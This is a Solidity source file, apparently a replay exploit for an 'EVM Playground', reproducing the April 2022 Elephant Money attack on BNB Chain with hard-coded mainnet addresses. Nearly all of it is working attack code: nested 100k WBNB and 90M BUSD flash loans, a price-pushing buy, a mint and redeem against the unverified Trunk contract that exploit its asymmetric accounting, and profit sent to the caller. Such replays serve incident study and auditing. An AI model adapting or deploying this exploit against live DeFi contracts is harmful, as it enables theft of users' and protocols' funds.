// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-04-Elephant_Money).
// Adapted for recorder: imports interface.sol (consistent with Beanstalk style),
// uses contract Exploit + exploit() public payable entrypoint, no forge-std/cheats.
// Replays the key sequence from the PoC: nested flash swaps -> price push buy Elephant
// -> mint Trunk (vulnerable buyback at inflated price) -> sell Elephant -> redeem Trunk
// (asymmetric full BUSD payout) -> residual sell -> repay flashes -> profit to msg.sender + logs.
// Root cause: unverified Trunk router's mint() does internal Elephant buyback (at manipulated price)
// while redeem() pays face-value BUSD with no reverse adjustment or symmetric accounting.

import "./../interface.sol";

contract Exploit {
    event log_named_uint(string key, uint val);

    IWBNB constant wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IPancakePair constant BUSD_USDT_PAIR = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IPancakePair constant ELEPHANT_WBNB_PAIR = IPancakePair(0x1CEa83EC5E48D9157fCAe27a19807BeF79195Ce1);
    IPancakePair constant WBNB_USDT_PAIR = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);

    IERC20 constant busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 constant elephant = IERC20(0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688);
    IERC20 constant trunk = IERC20(0xdd325C38b12903B727D16961e61333f4871A70E0);

    IRouter constant router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    InotVerified constant notVerified = InotVerified(0xD520a3B47E42a1063617A9b6273B206a07bDf834);

    address[] path1 = [address(wbnb), address(elephant)];
    address[] path2 = [address(elephant), address(wbnb)];
    address[] path4 = [address(wbnb), address(busd)];

    constructor() {
        elephant.approve(address(router), type(uint256).max);
        trunk.approve(address(router), type(uint256).max);
        trunk.approve(address(notVerified), type(uint256).max);
        busd.approve(address(notVerified), type(uint256).max);
        wbnb.approve(address(router), type(uint256).max);
    }

    // Entry point for recorder: kick off the nested flash-loan stack.
    // payable to be consistent with other playground synthetics (may receive seed value).
    function exploit() public payable {
        // Outer flash loan of 100k WBNB triggers the chain (pancakeCall dispatches to inner then attack).
        WBNB_USDT_PAIR.swap(0, 100_000 ether, address(this), "0x00");

        // After full sequence (flashes + attack + repays) returns here, profit is in BUSD on this contract.
        // Transfer to msg.sender (recorder/attacker) and emit for UI visibility of success + profit.
        uint256 profit = busd.balanceOf(address(this));
        if (profit > 0) {
            busd.transfer(msg.sender, profit);
        }
        emit log_named_uint("Profit transferred (BUSD)", profit);

        // Additional key value logs for the playground trace / story.
        emit log_named_uint("Final attacker WBNB balance", wbnb.balanceOf(msg.sender));
        emit log_named_uint("Final attacker BUSD balance", busd.balanceOf(msg.sender));
    }

    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        if (msg.sender == address(WBNB_USDT_PAIR)) {
            // Inner flash of 90M BUSD.
            BUSD_USDT_PAIR.swap(0, 90_000_000 ether, address(this), "0x00");
        } else {
            attack();
        }
    }

    function attack() internal {
        wbnb.withdraw(100_000 ether);

        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 100_000 ether}(
            0, path1, address(this), block.timestamp
        );

        uint256 balanceElephant = elephant.balanceOf(address(this));

        notVerified.mint(90_000_000 ether);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            balanceElephant, 0, path2, address(this), block.timestamp
        );

        uint256 balanceTrunk = trunk.balanceOf(address(this));

        notVerified.redeem(balanceTrunk);

        uint256 b3 = elephant.balanceOf(address(this));
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(b3, 0, path2, address(this), block.timestamp);

        wbnb.transfer(address(WBNB_USDT_PAIR), 100_300 ether);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wbnb.balanceOf(address(this)), 0, path4, address(this), block.timestamp
        );

        busd.transfer(address(BUSD_USDT_PAIR), 90_300_000 ether);
    }

    receive() external payable {}
}
